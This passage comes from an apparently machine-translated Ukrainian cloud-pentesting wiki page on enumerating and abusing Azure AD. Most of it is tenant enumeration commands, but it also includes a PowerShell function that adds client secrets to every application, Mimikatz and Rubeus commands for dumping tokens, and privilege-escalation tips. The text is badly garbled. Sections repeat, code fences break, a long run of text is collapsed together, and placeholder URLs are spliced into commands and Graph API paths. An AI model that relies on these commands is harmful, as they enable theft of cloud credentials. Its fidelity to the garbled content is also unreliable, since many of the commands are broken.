az rest --method get --uri https://json.servicePrincipals
```

**Using Graph API**

```bash
GET https://graph.microsoft.com/v1.0/users
GET https://graph.microsoft.com/v1.0/groups
GET https://graph.microsoft.com/vjson/servicePrjsonincipals
```

```powershell
# Enumerate Groups
Get-AzureADGroup -All $true
# Get info of 1 group
Get-AzADGroup -DisplayName <resource_group_name> | fl
# Get "admin" groups
Get-AzureADGroup -SearchString "admin" | fl #Groups starting by "admin"
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"} #Groups with the word "admin"
# Get groups allowing dynamic membership
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are from Azure AD
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Get members of a group
Get-AzureADGroupMember -ObjectId <group_id>
# Get roles of group
Get-AzureADMSGroup -SearchString "Contoso_Helpdesk_Administrators" #Get group id
Get-AzureADMSRoleAssignment -Filter "principalId eq '69584002-b4d1-4055-9c94-320542efd653'"
# Get Administrative Units of a group
$groupObj = Get-AzureADGroup -Filter "displayname eq 'TestGroup'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where {$_.Id -eq $groupObj.ObjectId} }
```

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Az PowerShell –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ Azure AD. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏ –¥–ª—è —Ä–æ–±–æ—Ç–∏ –∑ Azure AD:

1. –ü—ñ–¥–∫–ª—é—á—ñ—Ç—å—Å—è –¥–æ Azure AD:

```bash
Connect-AzAccount
```

2. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤:

```bash
Get-AzADUser
```

3. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –≥—Ä—É–ø–∏:

```bash
Get-AzADGroup
```

4. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –¥–æ–¥–∞—Ç–∫–∏:

```bash
Get-AzADApplication
```

5. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏:

```bash
Get-AzADCertificate
```

6. –û—Ç—Ä–∏–º–∞–π—Ç–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —É–ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω–Ω—è:

````bash
Get-AzADServicePrincipal
```</div>

```powershell
# Get all groups
Get-AzADGroup
# Get details of a group
Get-AzADGroup -ObjectId <id>
# Search group by string
Get-AzADGroup -SearchString "admin" | fl * #Search at the beginnig of DisplayName
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of group
Get-AzADGroupMember -GroupDisplayName <resource_group_name>
# Get roles of group
Get-AzRoleAssignment -ResourceGroupName <resource_group_name>
````

#### –î–æ–¥–∞–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ –≥—Ä—É–ø–∏

–í–ª–∞—Å–Ω–∏–∫–∏ –≥—Ä—É–ø–∏ –º–æ–∂—É—Ç—å –¥–æ–¥–∞–≤–∞—Ç–∏ –Ω–æ–≤–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ –≥—Ä—É–ø–∏

{% code overflow="wrap" %}
```powershell
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```
{% endcode %}

{% hint style="warning" %}
–ì—Ä—É–ø–∏ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–º–∏, —â–æ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É –æ–∑–Ω–∞—á–∞—î, —â–æ **—è–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø–µ–≤–Ω–∏–º —É–º–æ–≤–∞–º, –≤—ñ–Ω –±—É–¥–µ –¥–æ–¥–∞–Ω–∏–π –¥–æ –≥—Ä—É–ø–∏**. –ó–≤–∏—á–∞–π–Ω–æ, —è–∫—â–æ —É–º–æ–≤–∏ –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ **–∞—Ç—Ä–∏–±—É—Ç–∞—Ö**, —è–∫—ñ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏**, –≤—ñ–Ω –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é —Ñ—É–Ω–∫—Ü—ñ—î—é, —â–æ–± **–ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ —ñ–Ω—à—ñ –≥—Ä—É–ø–∏**.\
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–∏–º–∏ –≥—Ä—É–ø–∞–º–∏ –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:
{% endhint %}

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

### –°–µ—Ä–≤—ñ—Å–Ω—ñ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏ / –ü—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫—ñ –¥–æ–¥–∞—Ç–∫–∏

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–°–µ—Ä–≤—ñ—Å–Ω–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª** –≤ —Ç–µ—Ä–º—ñ–Ω–æ–ª–æ–≥—ñ—ó PowerShell **–Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è** **–ü—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫—ñ –¥–æ–¥–∞—Ç–∫–∏** –≤ –≤–µ–±-–ø–æ—Ä—Ç–∞–ª—ñ Azure.
{% endhint %}

{% tabs %}
{% tab title="az cli" %}
```bash
# Get Service Principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get details of one SP
az ad sp show --id 00000000-0000-0000-0000-000000000000
# Search SP by string
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# Get owner of service principal
az ad sp owner list --id <id> --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}
### Azure AD

#### Enumeration

**Get Tenant Info**

```bash
az account show
```

**List all users**

```bash
az ad user list
```

**List all groups**

```bash
az ad group list
```

**List all applications**

```bash
az ad app list
``json
```

```powershell
# Get Service Principals
Get-AzureADServicePrincipal -All $true
# Get details about a SP
Get-AzureADServicePrincipal -ObjectId <id> | fl *
# Get SP by string name or Id
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"} | fl
Get-AzureADServicePrincipal -All $true | ?{$_.AppId -match "103947652-1234-5834-103846517389"}
# Get owner of SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwner |fl *
# Get objects owned by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwnedObject
# Get objects created by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalCreatedObject
# Get groups where the SP is a member
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalMembership |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %}
#### Az PowerShell

**Connect to Azure AD**

```bash
Connect-AzAccount
```

**List all users**

```bash
Get-AzureADUser
```

**List all groups**

```bash
Get-AzureADGroup
```

**List all applications**

```bash
Get-AzureADApplication
```

**List all service principals**

```bash
Get-AzureADServicePrincipal
```

**List all devices**

```bash
Get-AzureADDevice
```

**List all roles**

```bash
Get-AzureADDirectoryRole
```

**List all role assignments**

```bash
Get-AzureADDirectoryRoleMember
```

**List all role definitions**

```bash
Get-AzureADDirectoryRoleTemplate
```

**List all domains**

```bash
Get-AzureADDomain
```

**List all registered domains**

```bash
Get-AzureADSubscribedSku
```

**List all licenses**

```bash
Get-AzureADUserLicenseDetail
``json
```

```powershell
# Get SPs
Get-AzADServicePrincipal
# Get info of 1 SP
Get-AzADServicePrincipal -ObjectId <id>
# Search SP by string
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
# Get roles of a SP
Get-AzRoleAssignment -ServicePrincipalName <String>
```
{% endtab %}

{% tab title="–ü–µ—Ä–µ–∫–ª–∞–¥" %}
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
–í–ª–∞—Å–Ω–∏–∫ —Å–ª—É–∂–±–æ–≤–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ –ø–∞—Ä–æ–ª—å.
{% endhint %}

<details>

<summary>–ü–µ—Ä–µ–ª—ñ–∫ —Ç–∞ —Å–ø—Ä–æ–±–∞ –¥–æ–¥–∞—Ç–∏ –∫–ª—ñ—î–Ω—Ç—Å—å–∫–∏–π —Å–µ–∫—Ä–µ—Ç –¥–æ –∫–æ–∂–Ω–æ–≥–æ –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞</summary>

\`\`\`powershell # Just call Add-AzADAppSecret Function Add-AzADAppSecret { <# .SYNOPSIS Add client secret to the applications.

.PARAMETER GraphToken Pass the Graph API Token

.EXAMPLE PS C:> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

.LINK https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0\&tabs=http https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0\&tabs=http #>

\[CmdletBinding()] param( \[Parameter(Mandatory=$True)] \[String] $GraphToken = $null )

$AppList = $null $AppPassword = $null

## List All the Applications

$Params = @{ "URI" = "https://graph.microsoft.com/v1.0/applications" "Method" = "GET" "Headers" = @{ "Content-Type" = "application/json" "Authorization" = "Bearer $GraphToken" } }

try { $AppList = Invoke-RestMethod @Params -UseBasicParsing } catch { }

## Add Password in the Application

if($AppList -ne $null) { \[System.Collections.ArrayList]$Details = @()

foreach($App in $AppList.value) { $ID = $App.ID $psobj = New-Object PSObject

$Params = @{ "URI" = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword" "Method" = "POST" "Headers" = @{ "Content-Type" = "application/json" "Authorization" = "Bearer $GraphToken" } }

$Body = @{ "passwordCredential"= @{ "displayName" = "Password" } }

try { $AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json) Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText $Details.Add($psobj) | Out-Null } catch { Write-Output "Failed to add new client secret to '$($App.displayName)' Application." } } if($Details -ne $null) { Write-Output "" Write-Output "Client secret added to : " Write-Output $Details | fl \* } } else { Write-Output "Failed to Enumerate the Applications." } }

````
</details>

### –†–æ–ª—ñ

<div data-gb-custom-block data-tag="tabs"></div>

<div data-gb-custom-block data-tag="tab" data-title='az cli'>

```bash
# Get roles
az role definition list
# Get assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,resourceGroup:resourceGroup,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
````

### Azure AD

#### Enumerate Azure AD

**Using Azure CLI**

```bash
az ad user list
az ad group list
az ad sp list
```

**Using Graph API**

```bash
GET https://graph.windows.net/myorganization/users?api-version=1.6
GET https://graph.windows.net/myorganization/groups?api-version=1.6
GET https://jsonplaceholder.typicode.com/posts
```

#### Dump Azure AD

**Using Azure CLI**

```bash
az ad user list
az ad group list
az ad sp list
```

**Using Graph API**

```bash
GET https://graph.windows.net/myorganization/users?api-version=1.6
GET https://graph.windows.net/myorganization/groups?api-version=1.6
GET https://jsonplaceholder.typicode.com/posts
```

#### Dump Azure AD Tokens

**Using Mimikatz**

```bash
privilege::debug
sekurlsa::cloudap
token::elevate
token::whoami
```

**Using Rubeus**

````bash
Rubeus.exe asktgt /user:<user> /rc4:<NTLM Hash> /domain:<domain> /dc:<DC IP>
Rubeus.exe asktgs /ticket:<TGT Ticket> /service:<SPN> /rc4:<NTLM Hash>```

### Dump Azure AD Tokens

#### Using Mimikatz

```bash
privilege::debug
sekurlsa::cloudap
token::elevate
token::whoami
````

**Using Rubeus**

```bash
Rubeus.exe asktgt /user:<user> /rc4:<NTLM Hash> /domain:<domain> /dc:<DC IP>
Rubeus.exe asktgs /ticket:<TGT Ticket> /service:<SPN> /rc4:<NTLM Hash>
```

```powershell
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
Get-AzureADDirectoryRole -ObjectId <roleID> #Get info about the role
# Get custom roles - use AzureAdPreview
Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
# Users assigned a role (Global Administrator)
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
Get-AzureADDirectoryRole -ObjectId <id> | fl
# Roles of the Administrative Unit (who has permissions over the administrative unit and its members)
Get-AzureADMSScopedRoleMembership -Id <id> | fl *
```

#### Az PowerShell

**Connect to Azure AD**

```bash
Connect-AzAccount
```

**List all users**

```bash
Get-AzADUser
```

**List all groups**

```bash
Get-AzADGroup
```

**List all applications**

```bash
Get-AzADApplication
```

**List all service principals**

```bash
Get-AzADServicePrincipal
```

**List all devices**

```bash
Get-AzADDevice
```

**List all roles**

```bash
Get-AzRoleDefinition
```

**List all role assignments**

```bash
Get-AzRoleAssignment
```

**List all role definitions**

```bash
Get-AzRoleDefinition
```

**List all role assignments for a specific user**

```bash
Get-AzRoleAssignment -SignInName user@example.com
```

**List all role assignments for a specific group**

```bash
Get-AzRoleAssignment -ObjectId group-object-id
```

**List all role assignments for a specific service principal**

```bash
Get-AzRoleAssignment -ServicePrincipalName service-principal-name
```

**List all role assignments for a specific resource group**

```bash
Get-AzRoleAssignment -ResourceGroupName resource-group-name
```

**List all role assignments for a specific scope**

```bash
Get-AzRoleAssignment -Scope /subscriptions/subscription-id/resourceGroups/resource-group-name
```

**List all role assignments for a specific role definition**

```bash
Get-AzRoleAssignment -RoleDefinitionName role-definition-name
```

**List all role assignments for a specific role definition at a specific scope**

```bash
Get-AzRoleAssignment -RoleDefinitionName role-definition-name -Scope /subscriptions/subscription-id/resourceGroups/resource-group-name
``json
```

```powershell
# Get role assignments on the subscription
Get-AzRoleDefinition
# Get Role definition
Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
# Get roles of a user or resource
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
Get-AzRoleAssignment -Scope /subscriptions/<subscription-id>/resourceGroups/<res_group_name>/providers/Microsoft.Compute/virtualMachines/<vm_name>
```

```powershell
# Get permissions over a resource using ARM directly
$Token = (Get-AzAccessToken).Token
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

#### –ü—Ä–∏—Å—Ç—Ä–æ—ó

\# If you know how to do this send a PR!Azure ADEnumerate Azure ADUsing Azure CLIaz ad user listaz ad group listaz ad sp listUsing Graph APIGET https://graph.windows.net/myorganization/users?api-version=1.6GET https://graph.windows.net/myorganization/groups?api-version=1.6GET https://jsonplaceholder.typicode.com/postsDump Azure ADUsing Azure CLIaz ad user listaz ad group listaz ad sp listUsing Graph APIGET https://graph.windows.net/myorganization/users?api-version=1.6GET https://graph.windows.net/myorganization/groups?api-version=1.6GET https://jsonplaceholder.typicode.com/postsDump Azure AD TokensUsing Mimikatzprivilege::debugsekurlsa::cloudaptoken::elevatelsadump::cloudapUsing RubeusRubeus.exe asktgt /user:\<user> /rc4:\<NTLM Hash> /domain:\<domain> /dc:\<DC-IP>Rubeus.exe asktgs /ticket:\<TGT Ticket> /service:\<SPN> /rc4:\<NTLM Hash>jsonplaceholder.typicode.com/postsDump Azure AD CredentialsUsing Mimikatzprivilege::debugsekurlsa::cloudaptoken::elevatelsadump::cloudapUsing RubeusRubeus.exe asktgt /user:\<user> /rc4:\<NTLM Hash> /domain:\<domain> /dc:\<DC-IP>Rubejsonplaceholder.typicode.com/postsus.exe asktgs /ticket:\<TGT Ticket> /service:\<SPN> /rc4:\<NTLM Hash># Enumerate DevicesGet-AzureADDevice -All $true | fl \*# List all the active devices (and not the stale devices)Get-AzureADDevice -All $true | ?{$\_.ApproximateLastLogonTimeStamp -ne $null}# Get owners of all devicesGet-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwnerGet-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $\_.ObjectID){$\_;$user.UserPrincipalName;"\`n"\}}# Registred users of all the devicesGet-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUserGet-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $\_.ObjectID){$\_;$user.UserPrincipalName;"\`n"\}}# Get dives managed using IntuneGet-AzureADDevice -All $true | ?{$\_.IsCompliant -eq "True"}# Get devices owned by a userGet-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com# Get Administrative Units of a deviceGet-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -ObjectId $\_.ObjectId | where {$\_.ObjectId -eq $deviceObjId} }

–Ø–∫—â–æ –ø—Ä–∏—Å—Ç—Ä—ñ–π (VM) **–ø—Ä–∏—î–¥–Ω–∞–Ω–∏–π –¥–æ AzureAD**, –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ AzureAD –∑–º–æ–∂—É—Ç—å **—É–≤—ñ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É**.\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —É–≤—ñ–π—à–æ–≤—à–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —î **–≤–ª–∞—Å–Ω–∏–∫–æ–º** –ø—Ä–∏—Å—Ç—Ä–æ—é, –≤—ñ–Ω –±—É–¥–µ –º–∞—Ç–∏ –ø—Ä–∞–≤–∞ **–ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**.

#### –î–æ–¥–∞—Ç–∫–∏

**–î–æ–¥–∞—Ç–∫–∏** - —Ü–µ **—Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –¥–æ–¥–∞—Ç–∫—ñ–≤** –≤ –ø–æ—Ä—Ç–∞–ª—ñ (–Ω–µ –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫—ñ –¥–æ–¥–∞—Ç–∫–∏).\
–ê–ª–µ –∫–æ–∂–Ω–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—è –¥–æ–¥–∞—Ç–∫—É —Å—Ç–≤–æ—Ä–∏—Ç—å **–ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫** (**–°–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª**) –∑ —Ç–∞–∫–æ—é –∂ –Ω–∞–∑–≤–æ—é.\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ —î **–±–∞–≥–∞—Ç–æ–∞–Ω–∞–ª—ñ—Ç–∏—á–Ω–∏–º –¥–æ–¥–∞—Ç–∫–æ–º**, –≤ **—Ç—ñ–π –æ—Ä–µ–Ω–¥–∞—Ä—ñ—ó** –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ **—ñ–Ω—à–∏–π** –ø—ñ–¥–ø—Ä–∏—î–º–Ω–∏—Ü—å–∫–∏–π –¥–æ–¥–∞—Ç–æ–∫ (**–°–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª**) –∑ —Ç–∞–∫–æ—é –∂ –Ω–∞–∑–≤–æ—é.

–ü—ñ—Å–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥–æ–¥–∞—Ç–∫—É –Ω–∞–¥–∞—é—Ç—å—Å—è 2 —Ç–∏–ø–∏ –¥–æ–∑–≤–æ–ª—ñ–≤:

* **–î–æ–∑–≤–æ–ª–∏**, –Ω–∞–¥–∞–Ω—ñ **–°–ª—É–∂–±–æ–≤–æ–º—É –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É**
* **–î–æ–∑–≤–æ–ª–∏**, —è–∫—ñ –º–æ–∂–µ –º–∞—Ç–∏ —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **–¥–æ–¥–∞—Ç–æ–∫ –≤—ñ–¥ —ñ–º–µ–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**.

```bash
# List Apps
az ad app list
az ad app list --query "[].[displayName]" -o table
# Get info of 1 App
az ad app show --id 00000000-0000-0000-0000-000000000000
# Search App by string
az ad app list --query "[?contains(displayName,'app')].displayName"
# Get the owner of an application
az ad app owner list --id <id> --query "[].[displayName]" -o table
# List all the apps with an application password
az ad app list --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad app list --query "[?keyCredentials != null].displayName"
```

### Azure AD

#### Enumerate Azure AD

**Using Azure CLI**

```bash
az ad user list
az ad group list
az ad sp list
```

**Using Graph API**

```bash
GET https://graph.windows.net/myorganization/users?api-version=1.6
GET https://graph.windows.net/myorganization/groups?api-version=1.6
GET https://jsonplaceholder.typicode.com/posts
```

#### Dump Azure AD

**Using Azure CLI**

```bash
az ad user list
az ad group list
az ad sp list
```

**Using Graph API**

```bash
GET https://graph.windows.net/myorganization/users?api-version=1.6
GET https://graph.windows.net/myorganization/groups?api-version=1.6
GET https://jsonplaceholder.typicode.com/posts
```

#### Dump Azure AD Tokens

**Using Mimikatz**

```bash
privilege::debug
sekurlsa::cloudap
token::elevate
token::whoami
```

**Using Rubeus**

````bash
Rubeus.exe asktgt /user:<user> /rc4:<NTLM Hash> /domain:<domain> /dc:<DC IP>
Rubeus.exe asktgs /ticket:<TGT Ticket> /service:<SPN> /rc4:<NTLM Hash>```

### Dump Azure AD Tokens

#### Using Mimikatz

```bash
privilege::debug
sekurlsa::cloudap
token::elevate
token::whoami
````

**Using Rubeus**

```bash
Rubeus.exe asktgt /user:<user> /rc4:<NTLM Hash> /domain:<domain> /dc:<DC IP>
Rubejsonplaceholder.typicode.com/posts
```

```powershell
# List all registered applications
Get-AzureADApplication -All $true
# Get details of an application
Get-AzureADApplication -ObjectId <id>  | fl *
# List all the apps with an application password
Get-AzureADApplication -All $true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
# Get owner of an application
Get-AzureADApplication -ObjectId <id> | Get-AzureADApplicationOwner |fl *
```



```powershell
# Get Apps
Get-AzADApplication
# Get details of one App
Get-AzADApplication -ObjectId <id>
# Get App searching by string
Get-AzADApplication | ?{$_.DisplayName -match "app"}
# Get Apps with password
Get-AzADAppCredential
```

–î–æ–¥–∞—Ç–æ–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`AppRoleAssignment.ReadWrite`** –º–æ–∂–µ **–ø—ñ–¥–Ω—è—Ç–∏—Å—è –¥–æ —Ä—ñ–≤–Ω—è –ì–ª–æ–±–∞–ª—å–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞**, –Ω–∞–¥–∞—é—á–∏ —Å–æ–±—ñ —Ä–æ–ª—å.\
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó [**–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ**](https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48).

–°–µ–∫—Ä–µ—Ç–Ω–∏–π —Ä—è–¥–æ–∫, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –¥–æ–¥–∞—Ç–æ–∫ –¥–ª—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Å–≤–æ—î—ó —ñ–¥–µ–Ω—Ç–∏—á–Ω–æ—Å—Ç—ñ –ø—Ä–∏ –∑–∞–ø–∏—Ç—ñ —Ç–æ–∫–µ–Ω–∞, - —Ü–µ –ø–∞—Ä–æ–ª—å –¥–æ–¥–∞—Ç–∫–∞.\
–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ —Ü–µ–π **–ø–∞—Ä–æ–ª—å**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø —è–∫ **—Å–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª** **–≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** **–æ—Ä–µ–Ω–¥–∞—Ä—è**.\
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π –ø–∞—Ä–æ–ª—å –≤–∏–¥–Ω–æ –ª–∏—à–µ –ø—Ä–∏ –π–æ–≥–æ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó (–≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –π–æ–≥–æ, –∞–ª–µ –Ω–µ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –π–æ–≥–æ –∑–Ω–æ–≤—É).\
**–í–ª–∞—Å–Ω–∏–∫** **–¥–æ–¥–∞—Ç–∫–∞** –º–æ–∂–µ **–¥–æ–¥–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –ø–∞—Ä–æ–ª—å** (—â–æ–± –≤—ñ–Ω –º—ñ–≥ –≤–∏–¥–∞–∞–≤–∞—Ç–∏ —Å–µ–±–µ).\
–£–≤—ñ—Ö–æ–¥–∏ –≤ —è–∫–æ—Å—Ç—ñ —Ü–∏—Ö —Å–ª—É–∂–±–æ–≤–∏—Ö –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—ñ–≤ **–Ω–µ –ø–æ–∑–Ω–∞—á–∞—é—Ç—å—Å—è —è–∫ —Ä–∏–∑–∏–∫–æ–≤–∞–Ω—ñ** —ñ **–Ω–µ –º–∞—é—Ç—å –±–∞–≥–∞—Ç–æ—Ñ–∞–∫—Ç–æ—Ä–Ω–æ—ó –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó.**

